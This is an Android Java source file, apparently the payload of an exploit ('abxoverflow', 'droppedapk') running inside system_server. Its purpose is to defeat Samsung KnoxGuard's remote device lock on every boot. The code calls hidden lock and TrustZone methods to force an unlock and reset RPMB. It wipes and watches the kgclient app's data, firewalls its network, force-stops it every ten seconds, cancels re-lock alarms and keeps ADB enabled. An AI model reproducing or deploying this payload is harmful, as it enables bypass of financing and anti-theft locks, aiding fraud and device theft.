package com.example.abxoverflow.droppedapk;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.FileObserver;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;

import java.io.File;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

/**
 * v14-HEAPDUMP: Auto-unlock + neutralize KnoxGuardSeService internals + kgclient data wipe
 * + network block + force-stop + guardian thread.
 * Runs as UID 1000 inside system_server on every BOOT_COMPLETED.
 */
public class LaunchReceiver extends BroadcastReceiver {
    private static final String TAG = "AbxBootUnlock";
    private static volatile boolean guardianRunning = false;
    // Strong references to prevent GC from killing our watchers
    private static final java.util.List<FileObserver> fileObservers = new java.util.ArrayList<>();
    private static ContentObserver adbObserver;

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.e(TAG, "BOOT_COMPLETED received. v14-HEAPDUMP unlock starting...");

        // === PHASE 0: Wipe kgclient cached data FIRST ===
        wipeKgclientData();

        // === PHASE 1: Run the full unlock sequence ===
        runUnlockSequence(context);

        // === PHASE 2: Block kgclient network via firewall (BEFORE neutralize/enumerate) ===
        blockKgclientNetwork(context);

        // === PHASE 5: Neutralize KnoxGuardSeService internals (prevents re-lock from system_server) ===
        Object kgService = null;
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method getService = sm.getMethod("getService", String.class);
            kgService = getService.invoke(null, "knoxguard_service");
            if (kgService != null) {
                neutralizeKnoxGuardService(kgService, context);
            } else {
                Log.e(TAG, "PHASE 5: knoxguard_service is null");
            }
        } catch (Exception e) {
            Log.e(TAG, "PHASE 5: Failed to get knoxguard_service: " + e.getMessage());
        }

        // === PHASE 6: Enumerate knoxguard_service methods (log only — recon) ===
        if (kgService != null) {
            tryZeroKnoxCalls(kgService);
        }

        // === PHASE 3: Start guardian thread ===
        startWatchers(context);

        // === PHASE 4: Force-stop kgclient (kills processes, cancels alarms) ===
        forceStopKgclient(context);

        // Start Activity for visual feedback
        try {
            context.startActivity(new Intent(context, MainActivity.class)
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                .putExtra("action", 36));
        } catch (Exception e) {
            Log.e(TAG, "Activity start failed: " + e.getMessage());
        }

        Log.e(TAG, "v14-HEAPDUMP unlock sequence complete.");
    }

    /**
     * PHASE 0: Delete all cached data from kgclient.
     * Direct File.delete() does NOT trigger error 3001 (only pm clear does).
     * Without cached lock commands, kgclient can't re-lock on boot.
     */
    private void wipeKgclientData() {
        Log.e(TAG, "PHASE 0: Wiping kgclient cached data...");
        String[] dirs = {
            "/data/data/com.samsung.android.kgclient/shared_prefs",
            "/data/data/com.samsung.android.kgclient/databases",
            "/data/data/com.samsung.android.kgclient/cache",
            "/data/data/com.samsung.android.kgclient/files",
            "/data/data/com.samsung.android.kgclient/no_backup",
            "/data/data/com.samsung.android.kgclient/code_cache",
        };
        int deleted = 0;
        for (String dir : dirs) {
            deleted += deleteRecursive(new File(dir));
        }
        Log.e(TAG, "PHASE 0: Wiped " + deleted + " files from kgclient data");
    }

    private int deleteRecursive(File fileOrDir) {
        int count = 0;
        if (fileOrDir == null || !fileOrDir.exists()) return 0;
        if (fileOrDir.isDirectory()) {
            File[] children = fileOrDir.listFiles();
            if (children != null) {
                for (File child : children) {
                    count += deleteRecursive(child);
                }
            }
            // Don't delete the directory itself — just empty it
        } else {
            if (fileOrDir.delete()) {
                Log.e(TAG, "  Deleted: " + fileOrDir.getAbsolutePath());
                count++;
            } else {
                Log.e(TAG, "  FAILED to delete: " + fileOrDir.getAbsolutePath());
            }
        }
        return count;
    }

    /**
     * PHASE 1: The proven unlock sequence from v11-AUTOBOOT.
     */
    private void runUnlockSequence(Context context) {
        Log.e(TAG, "PHASE 1: Running unlock sequence...");
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method getService = sm.getMethod("getService", String.class);
            Object kgService = getService.invoke(null, "knoxguard_service");

            if (kgService != null) {
                // 1. setRemoteLockToLockscreen(false)
                tryCall(kgService, "setRemoteLockToLockscreen", new Class[]{boolean.class}, false);

                // 2. unlockCompleted()
                tryCall(kgService, "unlockCompleted", null);

                // 3. unbindFromLockScreen()
                tryCall(kgService, "unbindFromLockScreen", null);

                // 4. tz_unlockScreen(0)
                try {
                    ClassLoader cl = kgService.getClass().getClassLoader();
                    Class<?> nativeClass = cl.loadClass("com.samsung.android.knoxguard.service.KnoxGuardNative");
                    Method unlock = nativeClass.getDeclaredMethod("tz_unlockScreen", int.class);
                    unlock.setAccessible(true);
                    unlock.invoke(null, 0);
                    Log.e(TAG, "  tz_unlockScreen(0): OK");
                } catch (Exception e) { Log.e(TAG, "  tz_unlockScreen failed: " + e.getMessage()); }

                // 5. tz_resetRPMB(0, new byte[0])
                try {
                    ClassLoader cl = kgService.getClass().getClassLoader();
                    Class<?> nativeClass = cl.loadClass("com.samsung.android.knoxguard.service.KnoxGuardNative");
                    Method reset = nativeClass.getDeclaredMethod("tz_resetRPMB", int.class, byte[].class);
                    reset.setAccessible(true);
                    reset.invoke(null, 0, new byte[0]);
                    Log.e(TAG, "  tz_resetRPMB: OK");
                } catch (Exception e) { Log.e(TAG, "  tz_resetRPMB failed: " + e.getMessage()); }

                // 6. Unregister kgService's system receivers to prevent re-lock
                unregisterKgReceivers(kgService);
            }

            // 7. Re-enable ADB
            try {
                Settings.Global.putInt(context.getContentResolver(), Settings.Global.ADB_ENABLED, 1);
                Settings.Global.putInt(context.getContentResolver(), "development_settings_enabled", 1);
                Log.e(TAG, "  ADB re-enabled: OK");
            } catch (Exception e) { Log.e(TAG, "  ADB enable failed: " + e.getMessage()); }

            // 8. Set system property
            try {
                Class<?> sysProp = Class.forName("android.os.SystemProperties");
                Method set = sysProp.getMethod("set", String.class, String.class);
                set.invoke(null, "knox.kg.state", "Completed");
                Log.e(TAG, "  sysprop Completed: OK");
            } catch (Exception e) { Log.e(TAG, "  sysprop failed: " + e.getMessage()); }

        } catch (Exception e) {
            Log.e(TAG, "PHASE 1 failed: " + e.toString());
        }
    }

    /**
     * Unregister KnoxGuardSeService's internal broadcast receivers.
     * This prevents the service from receiving CONNECTIVITY_CHANGE and re-locking.
     */
    private void unregisterKgReceivers(Object kgService) {
        String[] receiverFields = {"mSystemReceiver", "mServiceSystemReceiver"};
        for (String fieldName : receiverFields) {
            try {
                Field receiverField = kgService.getClass().getDeclaredField(fieldName);
                receiverField.setAccessible(true);
                Object receiver = receiverField.get(kgService);
                if (receiver != null) {
                    Field ctxField = kgService.getClass().getDeclaredField("mContext");
                    ctxField.setAccessible(true);
                    Context ctx = (Context) ctxField.get(kgService);
                    ctx.unregisterReceiver((BroadcastReceiver) receiver);
                    receiverField.set(kgService, null);
                    Log.e(TAG, "  " + fieldName + " UNREGISTERED");
                }
            } catch (Exception e) {
                Log.e(TAG, "  " + fieldName + " unregister failed: " + e.getMessage());
            }
        }
    }

    /**
     * PHASE 2: Block kgclient's network access via NetworkManagementService firewall.
     */
    private void blockKgclientNetwork(Context context) {
        Log.e(TAG, "PHASE 2: Blocking kgclient network...");
        try {
            // Get kgclient's UID
            int kgclientUid = context.getPackageManager()
                .getApplicationInfo("com.samsung.android.kgclient", 0).uid;
            Log.e(TAG, "  kgclient UID: " + kgclientUid);

            // Get NetworkManagementService
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method getService = sm.getMethod("getService", String.class);
            IBinder nmsBinder = (IBinder) getService.invoke(null, "network_management");

            // Get the INetworkManagementService interface
            Class<?> nmsStub = Class.forName("android.os.INetworkManagementService$Stub");
            Method asInterface = nmsStub.getMethod("asInterface", IBinder.class);
            Object nms = asInterface.invoke(null, nmsBinder);

            // FIREWALL_CHAIN_STANDBY = 2 (denylist)
            // FIREWALL_RULE_DENY = 2
            try {
                Method setRule = nms.getClass().getMethod("setFirewallUidRule", int.class, int.class, int.class);
                setRule.invoke(nms, 2, kgclientUid, 2); // STANDBY chain, kgclient UID, DENY
                Log.e(TAG, "  Firewall DENY rule set for UID " + kgclientUid);
            } catch (Exception e) {
                Log.e(TAG, "  setFirewallUidRule failed: " + e.getMessage());
                // Fallback: try setFirewallChainEnabled + setFirewallUidRule
                try {
                    Method setChain = nms.getClass().getMethod("setFirewallChainEnabled", int.class, boolean.class);
                    setChain.invoke(nms, 2, true);
                    Method setRule = nms.getClass().getMethod("setFirewallUidRule", int.class, int.class, int.class);
                    setRule.invoke(nms, 2, kgclientUid, 2);
                    Log.e(TAG, "  Firewall chain enabled + DENY rule set");
                } catch (Exception e2) {
                    Log.e(TAG, "  Firewall fallback failed: " + e2.getMessage());
                }
            }

            // Also try NetworkPolicyManager as belt-and-suspenders
            try {
                Object npmBinder = getService.invoke(null, "netpolicy");
                Class<?> npmStub = Class.forName("android.net.INetworkPolicyManager$Stub");
                Method npmAsInterface = npmStub.getMethod("asInterface", IBinder.class);
                Object npm = npmAsInterface.invoke(null, npmBinder);
                // POLICY_REJECT_METERED_BACKGROUND = 1
                Method setUidPolicy = npm.getClass().getMethod("setUidPolicy", int.class, int.class);
                setUidPolicy.invoke(npm, kgclientUid, 1);
                Log.e(TAG, "  NetworkPolicy REJECT_METERED_BACKGROUND set for UID " + kgclientUid);
            } catch (Exception e) {
                Log.e(TAG, "  NetworkPolicy fallback failed: " + e.getMessage());
            }

        } catch (Exception e) {
            Log.e(TAG, "PHASE 2 failed: " + e.toString());
        }
    }

    /**
     * PHASE 3: Event-driven watchers + periodic kgclient force-stop.
     * - FileObserver: instantly deletes any new files kgclient writes
     * - ContentObserver: instantly re-enables ADB if anything disables it
     * - Handler: force-stops kgclient every 10 seconds if it restarts
     */
    private void startWatchers(final Context context) {
        if (guardianRunning) {
            Log.e(TAG, "PHASE 3: Watchers already running, skipping");
            return;
        }
        guardianRunning = true;
        Log.e(TAG, "PHASE 3: Starting event-driven watchers + periodic force-stop");

        // FileObserver on kgclient's data directory — wipe any new files immediately
        String kgDataDir = "/data/data/com.samsung.android.kgclient";
        String[] watchDirs = {"shared_prefs", "databases", "files", "cache", "no_backup"};
        for (String sub : watchDirs) {
            final String watchPath = kgDataDir + "/" + sub;
            File dir = new File(watchPath);
            if (!dir.exists()) continue;

            final FileObserver observer = new FileObserver(watchPath,
                    FileObserver.CREATE | FileObserver.MODIFY | FileObserver.MOVED_TO) {
                @Override
                public void onEvent(int event, String path) {
                    if (path == null) return;
                    File target = new File(watchPath + "/" + path);
                    if (target.exists() && target.isFile()) {
                        boolean deleted = target.delete();
                        Log.e(TAG, "WATCHER: kgclient wrote " + path + " — deleted=" + deleted);
                    }
                }
            };
            observer.startWatching();
            fileObservers.add(observer); // prevent GC
            Log.e(TAG, "  FileObserver on " + watchPath + ": active");
        }

        // ContentObserver on ADB_ENABLED — re-enable if anything turns it off
        try {
            Uri adbUri = Settings.Global.getUriFor(Settings.Global.ADB_ENABLED);
            context.getContentResolver().registerContentObserver(adbUri, false,
                new ContentObserver(new Handler(Looper.getMainLooper())) {
                    @Override
                    public void onChange(boolean selfChange) {
                        try {
                            int val = Settings.Global.getInt(context.getContentResolver(),
                                    Settings.Global.ADB_ENABLED, 0);
                            if (val != 1) {
                                Settings.Global.putInt(context.getContentResolver(),
                                        Settings.Global.ADB_ENABLED, 1);
                                Log.e(TAG, "WATCHER: ADB was disabled — re-enabled");
                            }
                        } catch (Exception e) {
                            Log.e(TAG, "WATCHER: ADB observer error: " + e.getMessage());
                        }
                    }
                });
            Log.e(TAG, "  ContentObserver on ADB_ENABLED: active");
        } catch (Exception e) {
            Log.e(TAG, "  ContentObserver setup failed: " + e.getMessage());
        }

        // Periodic force-stop: check every 10 seconds if kgclient is running, kill it
        final Context appCtx = context.getApplicationContext();
        final Handler forceStopHandler = new Handler(Looper.getMainLooper());
        final Runnable forceStopRunnable = new Runnable() {
            @Override
            public void run() {
                try {
                    android.app.ActivityManager am = (android.app.ActivityManager)
                        appCtx.getSystemService(Context.ACTIVITY_SERVICE);
                    java.util.List<android.app.ActivityManager.RunningAppProcessInfo> procs =
                        am.getRunningAppProcesses();
                    if (procs != null) {
                        for (android.app.ActivityManager.RunningAppProcessInfo proc : procs) {
                            if (proc.processName != null &&
                                proc.processName.contains("com.samsung.android.kgclient")) {
                                callForceStop(am, "com.samsung.android.kgclient");
                                Log.e(TAG, "WATCHDOG: kgclient was running — force-stopped");
                                break;
                            }
                        }
                    }
                } catch (Throwable t) {
                    Log.e(TAG, "WATCHDOG: force-stop check failed: " + t.getMessage());
                }
                forceStopHandler.postDelayed(this, 10000);
            }
        };
        forceStopHandler.postDelayed(forceStopRunnable, 10000);
        Log.e(TAG, "  Periodic force-stop watchdog: active (every 10s)");

        Log.e(TAG, "PHASE 3: All watchers active.");
    }

    /**
     * PHASE 5: Neutralize KnoxGuardSeService internals.
     * The re-lock comes from INSIDE system_server, not kgclient.
     * Cancel alarms + unregister receivers + null callbacks = no path to re-lock.
     * DO NOT null mLockSettingsService — if retry alarm fires and setRetryLock fails,
     * Utils.powerOff() shuts down the phone.
     */
    private void neutralizeKnoxGuardService(Object kgService, Context context) {
        Log.e(TAG, "PHASE 5: Neutralizing KnoxGuardSeService internals...");

        // 1. Null out mRemoteLockMonitorCallback — safe, prevents lock monitor
        try {
            Field cbField = kgService.getClass().getDeclaredField("mRemoteLockMonitorCallback");
            cbField.setAccessible(true);
            cbField.set(kgService, null);
            Log.e(TAG, "  mRemoteLockMonitorCallback NULLED");
        } catch (Exception e) { Log.e(TAG, "  mRemoteLockMonitorCallback: " + e.getMessage()); }

        // 2. Unregister ALL BroadcastReceiver fields (catches USER_PRESENT + anything else)
        try {
            Field ctxField = kgService.getClass().getDeclaredField("mContext");
            ctxField.setAccessible(true);
            Context svcCtx = (Context) ctxField.get(kgService);

            for (Field f : kgService.getClass().getDeclaredFields()) {
                try {
                    f.setAccessible(true);
                    Object val = f.get(kgService);
                    if (val instanceof BroadcastReceiver) {
                        svcCtx.unregisterReceiver((BroadcastReceiver) val);
                        f.set(kgService, null);
                        Log.e(TAG, "  " + f.getName() + " UNREGISTERED+NULLED");
                    }
                } catch (Exception e) { /* skip non-receiver fields */ }
            }
        } catch (Exception e) { Log.e(TAG, "  receiver scan failed: " + e.getMessage()); }

        // 3. Cancel RETRY_LOCK alarm — prevents retry lock that leads to powerOff
        android.app.AlarmManager alarmMgr = (android.app.AlarmManager)
            context.getSystemService(Context.ALARM_SERVICE);
        try {
            Intent retryIntent = new Intent("com.samsung.android.knoxguard.RETRY_LOCK");
            android.app.PendingIntent pi = android.app.PendingIntent.getBroadcast(
                context, 0, retryIntent,
                android.app.PendingIntent.FLAG_NO_CREATE | android.app.PendingIntent.FLAG_IMMUTABLE);
            if (pi != null) {
                alarmMgr.cancel(pi);
                pi.cancel();
                Log.e(TAG, "  RETRY_LOCK alarm CANCELLED");
            } else {
                Log.e(TAG, "  No RETRY_LOCK alarm found");
            }
        } catch (Exception e) { Log.e(TAG, "  alarm cancel failed: " + e.getMessage()); }

        // 4. Cancel kgclient PROCESS_CHECK alarm
        try {
            Intent processCheck = new Intent("com.samsung.android.kgclient.action.STARTMESSAGETOCHECKLOCK");
            android.app.PendingIntent pi2 = android.app.PendingIntent.getBroadcast(
                context, 0, processCheck,
                android.app.PendingIntent.FLAG_NO_CREATE | android.app.PendingIntent.FLAG_IMMUTABLE);
            if (pi2 != null) {
                alarmMgr.cancel(pi2);
                pi2.cancel();
                Log.e(TAG, "  PROCESS_CHECK alarm CANCELLED");
            } else {
                Log.e(TAG, "  No PROCESS_CHECK alarm found");
            }
        } catch (Exception e) { Log.e(TAG, "  process check cancel failed: " + e.getMessage()); }

        // 5. Log all int fields to find TA state variable
        try {
            for (Field f : kgService.getClass().getDeclaredFields()) {
                if (f.getType() == int.class) {
                    f.setAccessible(true);
                    Log.e(TAG, "  INT: " + f.getName() + " = " + f.getInt(kgService));
                }
            }
        } catch (Exception e) { Log.e(TAG, "  int scan failed: " + e.getMessage()); }

        Log.e(TAG, "PHASE 5: Neutralization complete.");
    }

    /**
     * PHASE 4: Force-stop kgclient immediately.
     */
    private void forceStopKgclient(Context context) {
        Log.e(TAG, "PHASE 4: Force-stopping kgclient...");
        try {
            android.app.ActivityManager am = (android.app.ActivityManager)
                context.getSystemService(Context.ACTIVITY_SERVICE);
            callForceStop(am, "com.samsung.android.kgclient");
            Log.e(TAG, "  kgclient force-stopped: OK");
        } catch (Exception e) {
            Log.e(TAG, "  kgclient force-stop failed: " + e.getMessage());
        }
    }

    /** Call ActivityManager.forceStopPackage via reflection (hidden API). */
    private void callForceStop(android.app.ActivityManager am, String packageName) throws Exception {
        Method m = am.getClass().getDeclaredMethod("forceStopPackage", String.class);
        m.setAccessible(true);
        m.invoke(am, packageName);
    }

    /**
     * PHASE 6: ZeroKnox-style method enumeration (LOG ONLY — no invocations).
     * Reconnaissance: enumerate all methods on KnoxGuardSeService so we can decide
     * which ones to call after reviewing the output.
     */
    private void tryZeroKnoxCalls(Object kgService) {
        try {
            Log.e(TAG, "PHASE 6: Enumerating knoxguard_service methods (log only)...");

            Method[] methods = kgService.getClass().getDeclaredMethods();
            Log.e(TAG, "  knoxguard_service has " + methods.length + " declared methods:");
            for (int i = 0; i < methods.length; i++) {
                StringBuilder sig = new StringBuilder();
                sig.append("  [").append(i).append("] ").append(methods[i].getName()).append("(");
                Class<?>[] params = methods[i].getParameterTypes();
                for (int j = 0; j < params.length; j++) {
                    if (j > 0) sig.append(", ");
                    sig.append(params[j].getName());
                }
                sig.append(") -> ").append(methods[i].getReturnType().getName());
                Log.e(TAG, sig.toString());
            }

            // Also enumerate fields for complete picture
            Field[] fields = kgService.getClass().getDeclaredFields();
            Log.e(TAG, "  knoxguard_service has " + fields.length + " declared fields:");
            for (int i = 0; i < fields.length; i++) {
                Log.e(TAG, "  FIELD[" + i + "] " + fields[i].getName()
                    + " : " + fields[i].getType().getName());
            }

            Log.e(TAG, "PHASE 6: Enumeration complete.");
        } catch (Throwable t) {
            Log.e(TAG, "PHASE 6: Enumeration failed: " + t.getMessage());
        }
    }

    /** Helper: call a method on an object with optional args */
    private void tryCall(Object obj, String methodName, Class<?>[] paramTypes, Object... args) {
        try {
            Method m;
            if (paramTypes != null) {
                m = obj.getClass().getDeclaredMethod(methodName, paramTypes);
            } else {
                m = obj.getClass().getDeclaredMethod(methodName);
            }
            m.setAccessible(true);
            m.invoke(obj, args);
            Log.e(TAG, "  " + methodName + ": OK");
        } catch (Exception e) {
            Log.e(TAG, "  " + methodName + " failed: " + e.getMessage());
        }
    }
}
